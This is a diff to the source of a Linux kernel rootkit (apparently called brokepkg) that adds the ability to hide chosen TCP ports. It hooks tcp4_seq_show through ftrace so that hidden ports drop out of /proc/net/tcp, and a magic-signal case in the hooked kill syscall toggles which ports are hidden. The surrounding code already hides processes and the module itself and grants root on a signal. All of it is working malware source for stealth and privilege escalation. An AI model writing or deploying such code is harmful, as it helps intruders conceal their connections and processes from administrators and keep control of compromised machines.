@@ -16,6 +16,7 @@ orig_getdents_t orig_getdents;
 orig_getdents64_t orig_getdents64;
 orig_kill_t orig_kill;
 #endif
+static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
 
 static inline void tidy(void) {
   kfree(THIS_MODULE->sect_attrs);
@@ -25,6 +26,7 @@ static inline void tidy(void) {
 static struct list_head *prev_module;
 static short isHidden = 0;
 char hide_pid[NAME_MAX];
+unsigned short hide_port[MAX_TCP_PORTS] = {0};
 
 void module_show(void) {
   list_add(&THIS_MODULE->list, prev_module);
@@ -48,6 +50,38 @@ void pid_hide(pid_t pid) {
 #ifdef DEBUG
   printk(KERN_INFO "brokepkg: hiding process with pid %d\n", pid);
 #endif
+}
+
+void port_hide(unsigned short port) {
+  size_t i;
+  for (i = 0; i < MAX_TCP_PORTS; i++) {
+    if (hide_port[i] == 0) {
+      hide_port[i] = port;
+      printk(KERN_INFO "Port %d hidden\n", port);
+      return;
+    }
+  }
+}
+
+void port_show(unsigned short port) {
+  size_t i;
+  for (i = 0; i < MAX_TCP_PORTS; i++) {
+    if (hide_port[i] == port) {
+      hide_port[i] = 0;
+      printk(KERN_INFO "Port %d unhidden\n", port);
+      return;
+    }
+  }
+}
+
+int port_is_hidden(unsigned short port) {
+  size_t i;
+  for (i = 0; i < MAX_TCP_PORTS; i++) {
+    if (hide_port[i] == port) {
+      return 1;  // true
+    }
+  }
+  return 0;  // false
 }
 
 void give_root(void) {
@@ -104,6 +138,12 @@ asmlinkage int hook_kill(pid_t pid, int sig) {
       break;
     case SIGROOT:
       give_root();
+      break;
+    case SIGPORT:
+      if (port_is_hidden((unsigned short)pid))
+        port_show((unsigned short)pid);
+      else
+        port_hide((unsigned short)pid);
       break;
 
     default:
@@ -234,10 +274,26 @@ done:
   return ret;
 }
 
+static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v) {
+  long ret;
+  struct sock *sk = v;
+
+  if (sk != (struct sock *)0x1) {
+    size_t i;
+    for (i = 0; i < MAX_TCP_PORTS; i++) {
+      if (hide_port[i] == sk->sk_num) return 0;
+    }
+  }
+
+  ret = orig_tcp4_seq_show(seq, v);
+  return ret;
+}
+
 static struct ftrace_hook hooks[] = {
     HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
     HOOK("__x64_sys_getdents", hook_getdents, &orig_getdents),
     HOOK("__x64_sys_kill", hook_kill, &orig_kill),
+    HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
 };
 
 static int __init rootkit_init(void) {
